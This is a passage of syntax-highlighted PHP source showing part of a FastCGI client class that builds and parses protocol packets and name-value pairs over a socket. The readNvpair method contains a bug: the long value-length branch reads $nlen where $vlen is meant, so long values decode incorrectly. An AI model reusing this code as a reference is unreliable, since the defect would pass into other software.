punctuation">&#125;</span></pre></td></tr><tr><td data-num="112"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="113"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="114"></td><td><pre>    <span class="token comment">/**</pre></td></tr><tr><td data-num="115"></td><td><pre>     * Build a FastCGI packet</pre></td></tr><tr><td data-num="116"></td><td><pre>     *</pre></td></tr><tr><td data-num="117"></td><td><pre>     * @param Integer $type Type of the packet</pre></td></tr><tr><td data-num="118"></td><td><pre>     * @param String $content Content of the packet</pre></td></tr><tr><td data-num="119"></td><td><pre>     * @param Integer $requestId RequestId</pre></td></tr><tr><td data-num="120"></td><td><pre>     */</span></pre></td></tr><tr><td data-num="121"></td><td><pre>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">buildPacket</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$requestId</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="122"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="123"></td><td><pre>        <span class="token variable">$clen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="124"></td><td><pre>        <span class="token keyword">return</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">VERSION_1</span><span class="token punctuation">)</span>         <span class="token comment">/* version */</span></pre></td></tr><tr><td data-num="125"></td><td><pre>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span>                    <span class="token comment">/* type */</span></pre></td></tr><tr><td data-num="126"></td><td><pre>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$requestId</span> <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token comment">/* requestIdB1 */</span></pre></td></tr><tr><td data-num="127"></td><td><pre>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$requestId</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>        <span class="token comment">/* requestIdB0 */</span></pre></td></tr><tr><td data-num="128"></td><td><pre>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$clen</span> <span class="token operator">>></span> <span class="token number">8</span> <span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>     <span class="token comment">/* contentLengthB1 */</span></pre></td></tr><tr><td data-num="129"></td><td><pre>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$clen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>             <span class="token comment">/* contentLengthB0 */</span></pre></td></tr><tr><td data-num="130"></td><td><pre>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment">/* paddingLength */</span></pre></td></tr><tr><td data-num="131"></td><td><pre>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment">/* reserved */</span></pre></td></tr><tr><td data-num="132"></td><td><pre>            <span class="token operator">.</span> <span class="token variable">$content</span><span class="token punctuation">;</span>                     <span class="token comment">/* content */</span></pre></td></tr><tr><td data-num="133"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="134"></td><td><pre>    <span class="token comment">/**</pre></td></tr><tr><td data-num="135"></td><td><pre>     * Build an FastCGI Name value pair</pre></td></tr><tr><td data-num="136"></td><td><pre>     *</pre></td></tr><tr><td data-num="137"></td><td><pre>     * @param String $name Name</pre></td></tr><tr><td data-num="138"></td><td><pre>     * @param String $value Value</pre></td></tr><tr><td data-num="139"></td><td><pre>     * @return String FastCGI Name value pair</pre></td></tr><tr><td data-num="140"></td><td><pre>     */</span></pre></td></tr><tr><td data-num="141"></td><td><pre>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="142"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="143"></td><td><pre>        <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="144"></td><td><pre>        <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="145"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="146"></td><td><pre>            <span class="token comment">/* nameLengthB0 */</span></pre></td></tr><tr><td data-num="147"></td><td><pre>            <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$nlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="148"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="149"></td><td><pre>            <span class="token comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span></pre></td></tr><tr><td data-num="150"></td><td><pre>            <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="151"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="152"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="153"></td><td><pre>            <span class="token comment">/* valueLengthB0 */</span></pre></td></tr><tr><td data-num="154"></td><td><pre>            <span class="token variable">$nvpair</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="155"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="156"></td><td><pre>            <span class="token comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span></pre></td></tr><tr><td data-num="157"></td><td><pre>            <span class="token variable">$nvpair</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="158"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="159"></td><td><pre>        <span class="token comment">/* nameData &amp; valueData */</span></pre></td></tr><tr><td data-num="160"></td><td><pre>        <span class="token keyword">return</span> <span class="token variable">$nvpair</span> <span class="token operator">.</span> <span class="token variable">$name</span> <span class="token operator">.</span> <span class="token variable">$value</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="161"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="162"></td><td><pre>    <span class="token comment">/**</pre></td></tr><tr><td data-num="163"></td><td><pre>     * Read a set of FastCGI Name value pairs</pre></td></tr><tr><td data-num="164"></td><td><pre>     *</pre></td></tr><tr><td data-num="165"></td><td><pre>     * @param String $data Data containing the set of FastCGI NVPair</pre></td></tr><tr><td data-num="166"></td><td><pre>     * @return array of NVPair</pre></td></tr><tr><td data-num="167"></td><td><pre>     */</span></pre></td></tr><tr><td data-num="168"></td><td><pre>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">readNvpair</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="169"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="170"></td><td><pre>        <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="171"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="172"></td><td><pre>            <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="173"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="174"></td><td><pre>        <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="175"></td><td><pre>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$p</span> <span class="token operator">!=</span> <span class="token variable">$length</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="176"></td><td><pre>            <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="177"></td><td><pre>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="178"></td><td><pre>                <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="179"></td><td><pre>                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="180"></td><td><pre>                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="181"></td><td><pre>                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="182"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="183"></td><td><pre>            <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="184"></td><td><pre>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="185"></td><td><pre>                <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="186"></td><td><pre>                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="187"></td><td><pre>                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="188"></td><td><pre>                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="189"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="190"></td><td><pre>            <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$nlen</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$nlen</span><span class="token punctuation">,</span> <span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="191"></td><td><pre>            <span class="token variable">$p</span> <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">+</span> <span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="192"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="193"></td><td><pre>        <span class="token keyword">return</span> <span class="token variable">$array</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="194"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="195"></td><td><pre>    <span class="token comment">/**</pre></td></tr><tr><td data-num="196"></td><td><pre>     * Decode a FastCGI Packet</pre></td></tr><tr><td data-num="197"></td><td><pre>     *</pre></td></tr><tr><td data-num="198"></td><td><pre>     * @param String $data String containing all the packet</pre></td></tr><tr><td data-num="199"></td><td><pre>     * @return array</pre></td></tr><tr><td data-num="200"></td><td><pre>     */</span></pre></td></tr><tr><td data-num="201"></td><td><pre>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">decodePacketHeader</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="202"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="203"></td><td><pre>        <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="204"></td><td><pre>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'version'</span><span class="token punctuation">]</span>       <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="205"></td><td><pre>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span>          <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="206"></td><td><pre>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'requestId'</span><span class="token punctuation">]</span>     <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="207"></td><td><pre>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="208"></td><td><pre>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">6</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="209"></td><td><pre>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'reserved'</span><span class="token punctuation">]</span>      <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="210"></td><td><pre>        <span class="token keyword">return</span> <span class="token variable">$ret</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="211"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="212"></td><td><pre>    <span class="token comment">/**</pre></td></tr><tr><td data-num="213"></td><td><pre>     * Read a FastCGI Packet</pre></td></tr><tr><td data-num="214"></td><td><pre>     *</pre></td></tr><tr><td data-num="215"></td><td><pre>     * @return array</pre></td></tr><tr><td data-num="216"></td><td><pre>     */</span></pre></td></tr><tr><td data-num="217"></td><td><pre>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="218"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="219"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$packet</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">HEADER_LEN</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="220"></td><td><pre>            <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">decodePacketHeader</span><span class="token punctuation">(</span><span class="token variable">$packet</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="221"></td><td><pre>            <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="222"></td><td><pre>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="223"></td><td><pre>                <span class="token variable">$len</span>  <span class="token operator">=</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="224"></td><td><pre>                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$len</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="225"></td><td><pre>                    <span class="token variable">$len</span> <span class="token operator">-=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$buf</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="226"></td><td><pre>                    <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token variable">$buf</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="227"></td><td><pre>                <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="228"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="229"></td><td><pre>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="230"></td><td><pre>                <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="231"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="232"></td><td><pre>            <span class="token keyword">return</span> <span class="token variable">$resp</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="233"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="234"></td><td><pre>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="235"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="236"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="237"></td><td><pre>    <span class="token comment">/**</pre></td></tr><tr><td data-num="238"></td><td><pre>     * Get Informations on the FastCGI application</pre></td></tr><tr><td data-num="239"></td><td><pre>     *</pre></td></tr><tr><td data-num="240"></td><td><pre>     * @param array $requestedInfo information to retrieve</pre></td></tr><tr><td data-num="241"></td><td><pre>     * @return array</pre></td></tr><tr><td data-num="242"></td><td><pre>     */</span></pre></td></tr><tr><td data-num="243"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getValues</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$requestedInfo</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="244"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="245"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="246"></td><td><pre>        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="247"></td><td><pre>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$requestedInfo</span> <span class="token keyword">as</span> <span class="token variable">$info</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="248"></td><td><pre>            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="249"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="250"></td><td><pre>        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">GET_VALUES</span><span class="token punctuation">,</span> <span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="251"></td><td><pre>        <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="252"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">GET_VALUES_RESULT</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td 